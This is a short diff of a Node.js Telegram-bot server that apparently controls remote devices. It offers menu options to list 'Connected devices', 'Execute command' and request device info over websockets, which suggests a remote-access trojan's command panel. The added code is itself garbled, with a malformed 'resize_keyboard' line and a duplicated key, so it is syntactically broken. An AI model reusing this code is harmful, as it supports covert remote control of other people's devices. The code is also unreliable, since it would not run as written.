@@ -1,4 +1,3 @@
-
 const express = require('express');
 const webSocket = require('ws');
 const http = require('http')
@@ -552,17 +551,15 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.sendMessage(id,
             '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
             '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-       {
-    bot.sendMessage(chatId, "Select option", {
-    parse_mode: "HTML",
-    reply_markup: {
-        keyboard: [
-            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"],
-            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]
-        ],
-        resize_keyboard: true
-    }
-});
+            {
+                parse_mode: "HTML",
+                "reply_markup": {
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                    'resize_keyboard],
+                    'resize_keyboard': true
+                }
+            }
+        )
     }
     if (commend == 'device_info') {
         appSocket.clients.forEach(function each(ws) {
